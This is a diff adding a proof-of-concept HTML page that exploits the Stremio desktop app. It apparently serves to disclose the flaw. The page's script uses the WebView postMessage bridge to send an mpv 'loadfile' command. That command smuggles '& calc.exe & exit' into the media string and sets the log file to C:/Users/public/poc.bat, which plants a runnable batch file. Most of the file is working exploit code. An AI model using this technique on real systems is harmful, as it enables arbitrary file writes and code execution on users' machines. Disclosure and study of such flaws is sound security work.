@@ -1,0 +1,25 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>POC - XSS to arbitrary write</title>
+<style>
+ body{background:#020202;color:#ffffff}
+</style>
+<h1>You are outside the app origin</h1>
+<p>This page is served by the PoC addon host. If you can read it inside the Stremio desktop window, the WebView main frame was navigated off https://web.stremio.com, and has access to it's webview.</p>
+<p>Proof of arbitrary write: A file called poc.bat has been placed at <code>C:/Users/public/poc.bat</code> that, when ran, opens calc.exe.</p>
+
+<script>
+setTimeout(() => {
+    console.log("Should have webview access. Writing file.");
+}, 1500); 
+const batPath = "C:/Users/public/poc.bat";
+const media = "av://lavfi:color=c=black:d=1#X & calc.exe & exit ";
+const opts = "log-file=" + batPath + ",msg-level=all=v";
+
+window.chrome.webview.postMessage(JSON.stringify({
+  id: 1,
+  args: ["mpv-command", ["loadfile", media, "replace", "0", opts]]
+}));
+</script>
+
+<a href="https://web.stremio.com/">back to Stremio...</a>
